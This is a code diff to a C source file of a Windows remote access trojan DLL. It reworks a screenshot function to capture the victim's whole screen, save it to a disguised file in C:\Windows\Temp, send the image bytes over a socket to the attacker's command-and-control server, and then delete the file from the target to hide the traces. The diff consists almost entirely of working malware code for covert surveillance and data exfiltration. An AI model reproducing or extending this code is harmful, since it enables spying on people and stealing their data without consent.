@@ -4,9 +4,17 @@
 
 #include "RAT-Dll-Screenshot.h"
 #include "RAT-Dll-Connect.h"
+#include "RAT-Dll-GetFile.h"
+#include "RAT-Dll-DeleteFile.h"
 
 
-INT doScreenshot()
+/** This function will perform a screenshot for us 
+params:
+* clientSock - current socket connection with out C2
+return:
+* if successful we return SUCCESS; otherwise print error code and handle appropiately
+*/
+INT performScreenshot(SOCKET clientSock)
 {
 	INT status = SUCCESS, width = 0, height = 0;
 	HDC hdcScreen, hdcMemDC = NULL;
@@ -16,14 +24,16 @@ INT doScreenshot()
 	CHAR msgBuf[DEFAULT_BUF_LEN];
 	BITMAPFILEHEADER   bmfHeader;
 	BITMAPINFOHEADER   bi;
-	DWORD dwBmpSize, dwSizeOfDIB, dwBytesWritten;
-	char* lpbitmap = NULL;
+	DWORD dwBmpSize, dwSizeOfDIB, dwBytesWritten, dwBufferSize = 0;
+	char* lpbitmap = NULL, **fileBytes = NULL;
+
+	OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Starting screenshot...\n");
 
 	// Get a device context (DC) for the entire screen
 	hdcScreen = GetDC(NULL);
 	if (hdcScreen == NULL)
 	{
-		OutputDebugStringA("RAT-Dll-Screenshot::doScreenshot - Failed call to GetDC!\n");
+		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed call to GetDC!\n");
 		status = FAILURE;
 		goto cleanup;
 	}
@@ -32,7 +42,7 @@ INT doScreenshot()
     hdcMemDC = CreateCompatibleDC(hdcScreen);
 	if (hdcMemDC == NULL)
 	{
-		OutputDebugStringA("RAT-Dll-Screenshot::doScreenshot - Failed call to CreateCompatibleDC!\n");
+		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed call to CreateCompatibleDC!\n");
 		status = FAILURE;
 		goto cleanup;
 	}
@@ -43,7 +53,7 @@ INT doScreenshot()
 	height = GetDeviceCaps(hdcScreen, VERTRES);
 	if (width == 0 || height == 0)
 	{
-		OutputDebugStringA("RAT-Dll-Screenshot::doScreenshot - Failed GetDeviceCaps!\n");
+		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed GetDeviceCaps!\n");
 		status = FAILURE;
 		goto cleanup;
 	}
@@ -52,7 +62,7 @@ INT doScreenshot()
 	hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);
 	if (hbmScreen == NULL)
 	{
-		OutputDebugStringA("RAT-Dll-Screenshot::doScreenshot - Failed CreateCompatibleBitmap!\n");
+		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed CreateCompatibleBitmap!\n");
 		status = FAILURE;
 		goto cleanup;
 	}
@@ -61,7 +71,7 @@ INT doScreenshot()
 	hbmOldScreen = (HBITMAP)(SelectObject(hdcMemDC, hbmScreen));
 	if (hbmOldScreen == NULL || hbmOldScreen == HGDI_ERROR)
 	{
-		OutputDebugStringA("RAT-Dll-Screenshot::doScreenshot - Failed SelectObject!\n");
+		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed SelectObject!\n");
 		status = FAILURE;
 		goto cleanup;
 	}
@@ -70,7 +80,7 @@ INT doScreenshot()
 	if (!BitBlt(hdcMemDC, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY))
 	{
 		status = GetLastError();
-		sprintf_s(msgBuf, "RAT-Dll-Screenshot::doScreenshot - Failure from BitBlt: %d\n", status);
+		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure from BitBlt: %d\n", status);
 		goto cleanup;
 	}
 
@@ -78,7 +88,7 @@ INT doScreenshot()
 	hbmScreen = (HBITMAP)(SelectObject(hdcMemDC, hbmOldScreen));
 	if (hbmScreen == NULL || hbmScreen == HGDI_ERROR)
 	{
-		OutputDebugStringA("RAT-Dll-Screenshot::doScreenshot - Failed SelectObject!\n");
+		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed SelectObject!\n");
 		status = FAILURE;
 		goto cleanup;
 	}
@@ -86,16 +96,17 @@ INT doScreenshot()
 	// Get the BITMAP from HBITMAP 
 	if (GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen) == 0)
 	{
-		OutputDebugStringA("RAT-Dll-Screenshot::doScreenshot - Failed GetObject!\n");
+		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed GetObject!\n");
 		status = FAILURE;
 		goto cleanup;
 	}
 
 	// Write to output file somewhere on disk
-	hFile = CreateFile(L"captureqwsx.bmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		// TODO: Randomize file path and name? Use system vars to get system root and stuff 
+	hFile = CreateFile(L"C:\\Windows\\Temp\\d3adb33f.bmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == NULL)
 	{
-		OutputDebugStringA("RAT-Dll-Screenshot::doScreenshot - Failed to create outputfile!\n");
+		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed to create outputfile!\n");
 		status = FAILURE;
 		goto cleanup;
 	}
@@ -142,14 +153,49 @@ INT doScreenshot()
 	// Close the handle for the file that was created.
 	CloseHandle(hFile);
 
-
-
-
+	OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Wrote screenshot file!\n");
 
 	// Call get file
 
+	fileBytes = (char**)malloc(sizeof(char*));
+	if (fileBytes == NULL)
+	{
+		OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Failed to allocate space for fileBytes buffer! \n");
+		status = FAILURE;
+		goto cleanup;
+	}
+
+	status = performGetFile("C:\\Windows\\Temp\\d3adb33f.bmp", fileBytes, &dwBufferSize);
+	if (status != SUCCESS)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure received from performGetFile %d\n", status);
+		OutputDebugStringA(msgBuf);
+	}
+
+	status = send(clientSock, *fileBytes, dwBufferSize, 0);
+	if (status == SOCKET_ERROR)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure recevied from send (file bytes) %d\n", WSAGetLastError());
+		OutputDebugStringA(msgBuf);
+		status = WSAGetLastError();
+		goto cleanup;
+	}
+
+	// Free the buffer we point to then free the memory we allocated for the pointer
+	free(*fileBytes);
+	free(fileBytes);
+
+	OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Sent file back to C2!\n");
 
 	// Call delete file 
+	status = performDeleteFile((char*)"C:\\Windows\\Temp\\d3adb33f.bmp");
+	if (status != SUCCESS)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Screenshot::performScreenshot - Failure received from performDeleteFile %d\n", status);
+		OutputDebugStringA(msgBuf);
+	}
+
+	OutputDebugStringA("RAT-Dll-Screenshot::performScreenshot - Deleted screenshot from target; cleaning up...\n");
 
 
 cleanup:
